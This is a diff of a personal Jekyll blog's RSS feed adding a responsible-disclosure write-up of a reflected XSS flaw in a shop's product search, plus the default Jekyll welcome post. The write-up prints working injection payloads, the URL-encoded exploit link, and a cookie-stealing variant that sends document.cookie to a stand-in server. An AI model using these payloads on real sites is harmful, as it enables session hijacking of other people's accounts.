@@ -3,11 +3,100 @@
   <channel>
     <title>Vincent De Schutter</title>
     <description>Tech junkie • Security enthousiast • Computer Science @ VUBrussels</description>
-    <link>http://vincentds.be//</link>
-    <atom:link href="http://vincentds.be//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 30 Mar 2016 23:34:57 +0200</pubDate>
-    <lastBuildDate>Wed, 30 Mar 2016 23:34:57 +0200</lastBuildDate>
+    <link>http://localhost:4000//</link>
+    <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 02 Apr 2016 23:12:39 +0200</pubDate>
+    <lastBuildDate>Sat, 02 Apr 2016 23:12:39 +0200</lastBuildDate>
     <generator>Jekyll v3.0.2</generator>
+    
+      <item>
+        <title>(First) Reflected XSS</title>
+        <description>&lt;p&gt;A few weeks ago, I took part in the &lt;a href=&quot;https://www.cybersecuritychallenge.be/&quot;&gt;Cyber Security Challenge Belgium&lt;/a&gt;, an annual CTF hosted by &lt;a href=&quot;https://www.nviso.be/&quot;&gt;NVISO&lt;/a&gt; intended for Belgian students to test their security knowledge. After talking with some experienced security researchers, they convinced me to start bug hunting. They advised me to start seeking for vulnerabilities on small independent websites instead of hunting large programs on &lt;a href=&quot;https://hackerone.com/&quot;&gt;HackerOne&lt;/a&gt; and &lt;a href=&quot;https://bugcrowd.com&quot;&gt;Bugcrowd&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;After crawling over various websites, I noticed some strange behaviour on the website of &lt;a href=&quot;https://www.brouwland.com/en&quot;&gt;Brouwland&lt;/a&gt;. Users are able to search for products by using the query input form. Since the resulting page includes the query string, I checked whether it was vulnerable to reflected XSS by entering some special characters.&lt;/p&gt;
+
+&lt;p&gt;The query &lt;code class=&quot;highlighter-rouge&quot;&gt;XSS&quot;&amp;gt;&lt;/code&gt; returned the following page:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/posts/first-xss-1.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/posts/first-xss-1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Surprisingly, the double quote and closing tag were not being escaped. HTML escaping exists in transforming special characters allowing the browser to interpret them as text instead of HTML code, which makes XSS impossible. Input which does not gets escaped? This seemed to easy. If I just close the current tag using &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;/*&amp;gt;&lt;/code&gt;, I could append my malicious script which will be executed by the browser. For example:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;test&amp;lt;/p&amp;gt;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, the input starting from the closing tags gets omitted in the returning string. Only &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; was reflected in the returning string. This technique, also known as sanitizing, is another common way to prevent XSS. Thus, these fields are invulnerable to XSS.&lt;/p&gt;
+
+&lt;p&gt;After analysing the source code for a second time, I found a more interesting place which reflected my query. The user can filter his search results using the buttons next to the search field. After querying, these buttons contain an href attribute which will execute a filtered search. For example, given input ‘XSS’:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/posts/first-xss-2.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/posts/first-xss-2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;A quick test reveals the input is neither escaped nor sanitized. Bazinga! Let’s just exit the current tag and inject our script using the following query:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;XSS&quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;However, this is detected by Google Chrome’s XSS auditor. The auditor identifies malicious request parameters and blocks the response if it believes the code is injected in the response.&lt;/p&gt;
+
+&lt;p&gt;Time to craft another query:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;XSS&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;img src=&quot;http://www.maliciouslink.com&quot;&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a class=&quot;btn btn-default&quot; href=&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Yay, this is accepted! Using URL encoding, we could create the following link:&lt;/p&gt;
+
+&lt;div style=&quot;overflow-x: auto; overflow-y: hidden; white-space: nowrap; font-style: italic;&quot;&gt;www.brouwland.com%2Fen%2Fsearch%3Fq%3DXSS%22%20%3E%3C%2Fa%3E%3C%2Fli%3E%3Cli%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.maliciouslink.com%22%3E%3C%2Fli%3E%3Cli%3E%3Ca%20class%3D%22btn%20btn-default%22%20href%3D%22&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+This results in the following source code:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/posts/first-xss-3.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/posts/first-xss-3.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The page looked like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/posts/first-xss-4.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/posts/first-xss-4.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hence, clicking the link will result in a request to &lt;code class=&quot;highlighter-rouge&quot;&gt;www.maliciouslink.com&lt;/code&gt;. Although this does not seem malicious, we could replace this link with &lt;code class=&quot;highlighter-rouge&quot;&gt;www.yourserver.com/cookie?+document.cookie&lt;/code&gt; to send the cookie of an authenticated user to your server and hijack their session. Another possible exploit is to use the onerror attribute in the img tag to execute some arbitrary JavaScript code:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=x onerror=alert(&#39;XSS&#39;) /&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;There are probably a dozen ways to exploit this vulnerability, however I reported it shortly after I found out the input did not get escaped or sanitized. Their team fixed the bug two days later and thanked me for my findings. Overall, it was a fun and easy first bug. Hopefully this is the start of many other bug discoveries!&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 02 Apr 2016 00:00:00 +0200</pubDate>
+        <link>http://localhost:4000//first-xss/</link>
+        <guid isPermaLink="true">http://localhost:4000//first-xss/</guid>
+        
+        <category>xss</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Welcome to Jekyll!</title>
+        <description>&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve --watch&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Tom&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &#39;Hi, Tom&#39; to STDOUT.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://github.com/jekyll/jekyll-help&quot;&gt;Jekyll’s dedicated Help repository&lt;/a&gt;.&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 08 Jan 2016 16:04:23 +0100</pubDate>
+        <link>http://localhost:4000//welcome-to-jekyll/</link>
+        <guid isPermaLink="true">http://localhost:4000//welcome-to-jekyll/</guid>
+        
+        <category>jekyll</category>
+        
+        
+        <category>jekyll</category>
+        
+      </item>
     
   </channel>
 </rss>
